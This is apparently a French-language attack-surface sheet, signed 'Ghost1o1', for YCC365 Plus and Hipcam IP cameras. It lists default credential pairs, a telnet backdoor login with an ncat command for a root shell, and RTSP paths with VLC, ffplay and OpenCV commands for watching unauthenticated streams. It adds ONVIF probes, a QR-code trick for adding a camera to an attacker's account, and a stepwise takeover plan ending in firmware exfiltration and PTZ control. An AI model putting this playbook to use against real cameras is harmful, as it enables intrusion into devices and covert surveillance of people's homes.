# 🎯 Surface d'Attaque YCC365 Plus

## Signé Ghost1o1 — Détail Complet des Vecteurs

---

## 📡 Réseau & Ports

### Ports Custom YCC365 / Hipcam SDK

| Port | Protocole | Description | Default Auth |
|------|-----------|-------------|--------------|
| `34567` | HTTP | Admin YCC365 backend | `admin:12345` ou `admin:888888` |
| `34599` | HTTP | Login YCC365 web | `admin:12345` |
| `9527`  | Telnet | **Backdoor Hipcam** | **`root:xmhdipc`** |
| `8000`  | HTTP | Admin alternatif | Variantes |
| `8899`  | ONVIF | WS-Discovery + SOAP | Souvent **no auth** |
| `554`   | RTSP | Streaming vidéo | Souvent **no auth** |

### Standards IoT

| Port | Service | Fréquence |
|------|---------|-----------|
| `80`   | HTTP | 99% |
| `443`  | HTTPS | 60% |
| `23`   | Telnet | 30% |
| `8080` | Admin | 25% |
| `8443` | Admin TLS | 15% |

---

## 🔐 Authentification

### Credentials par Défaut (23 testés)

```
admin:admin
admin:12345
admin:888888
admin:666666
admin:123
admin:password
admin:123456
admin:111111
admin:000000
admin:999999
admin:abc123
admin:admin123
user:user
user:12345
user:password
root:root
root:xmhdipc         ← BACKDOOR Hipcam
root:12345
root:pass
support:support
service:service
guest:guest
operator:operator
```

### 🔴 Backdoor Hipcam

Découvert en 2017 (CVE-2017-16919), toujours présent dans:
- YCC365 (firmware V3.x à V6.x)
- Clones HiSilicon
- Lots Temu/AliExpress 2020-2024

**Connexion** :
```bash
ncat -nv <ip> 9527
# Login: root
# Password: xmhdipc
# → Shell root direct
```

---

## 📹 RTSP Exposure

### Chemins Communs (21 testés)

#### Hikvision-compatibles
- `/onvif/streaming/channels/101` (primary)
- `/Streaming/Channels/101`
- `/Streaming/Channels/1`

#### Dahua-compatibles
- `/cam/realmonitor`
- `/live/ch00_0`

#### YCC365 spécifiques
- `/11` (channel 1)
- `/12` (channel 2)
- `/user=admin&password=&channel=1&stream=0.sdp`

#### HiSilicon génériques
- `/live/main`
- `/live/sub`
- `/video/main`
- `/mpeg4`
- `/h264`
- `/h264/ch01/main/av_stream`
- `/trackID=1`
- `/av0_0`
- `/0/usrnm:admin/0/usrpw:admin/0/1`
- `/live/0/main`
- `/live/0/sub`

### 🎬 Lecture Sans Auth

```bash
# VLC
vlc rtsp://<ip>:554/11

# ffplay
ffplay -rtsp_transport tcp rtsp://<ip>:554/live/ch00_0

# OpenCV (Python)
import cv2
cap = cv2.VideoCapture("rtsp://admin:@<ip>:554/11")
```

---

## 📡 ONVIF (Port 8899)

### WS-Discovery Probe

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Envelope xmlns:tds="http://www.onvif.org/ver10/device/wsdl"
          xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Header>
    <wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>
  </Header>
  <Body>
    <Probe>
      <Types>tds:Device</Types>
    </Probe>
  </Body>
</Envelope>
```

### GetDeviceInformation (sans auth)

```xml
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>
  </Body>
</Envelope>
```

**Réponse typique** :
```xml
<tds:GetDeviceInformationResponse>
  <tds:Manufacturer>HiSilicon</tds:Manufacturer>
  <tds:Model>YCC365 Plus</tds:Model>
  <tds:FirmwareVersion>V5.0.4</tds:FirmwareVersion>
  <tds:SerialNumber>HISCAM-XXX-XXX</tds:SerialNumber>
  <tds:HardwareId>0x1234</tds:HardwareId>
</tds:GetDeviceInformationResponse>
```

---

## 📲 QR Codes

### WiFi Provisioning

```
WIFI:T:WPA;S:<SSID>;P:<PASSWORD>;H:false;;
```

**Attaque** :
- QR code visible sur le boîtier
- Format texte brut, facilement décodable
- Permet extraction du mot de passe WiFi caméra

### Device Sharing (UID + Token)

```
ycc365://share?uid=ABC123&token=DEF456&lang=en
```

**Attaque** :
- QR scannable depuis l'app YCC365
- Permet ajout du device au compte attaquant
- Accès complet au flux + contrôle PTZ

---

## 🛠️ Méthodologie d'Audit (Ghost1o1)

### Phase 1: Reconnaissance
```
1. Identifier la marque/model (mDNS, HTTP banner, ONVIF)
2. Trouver les ports ouverts (nmap -p-)
3. Capturer le banner HTTP/RTSP/Telnet
```

### Phase 2: Authentification
```
4. Tester 23 credentials sur ports HTTP
5. Tester ONVIF sans auth → fuite device info
6. Tester backdoor Telnet 9527
```

### Phase 3: Streaming
```
7. Tester 21 paths RTSP
8. Vérifier accès sans auth
9. Tester qualité streams (main/sub)
```

### Phase 4: Prise de Contrôle
```
10. Si Telnet OK → accès root → exfiltration firmware
11. Si HTTP auth OK → panneau admin → config modification
12. Si ONVIF open → PTZ control + presets
```

---

## 🎯 Vulnérabilités par Version Firmware

| Firmware | CVE Connues | Niveau |
|----------|-------------|--------|
| V3.x | Backdoor Telnet, default creds | 🔴 CRITIQUE |
| V4.x | Backdoor Telnet, RTSP no auth | 🔴 CRITIQUE |
| V5.x | RTSP no auth, default creds | 🟠 HIGH |
| V6.x | Default creds only | 🟡 MED |

---

*Signé Ghost1o1 🏴‍☠️ — Audit methodology v1.0*
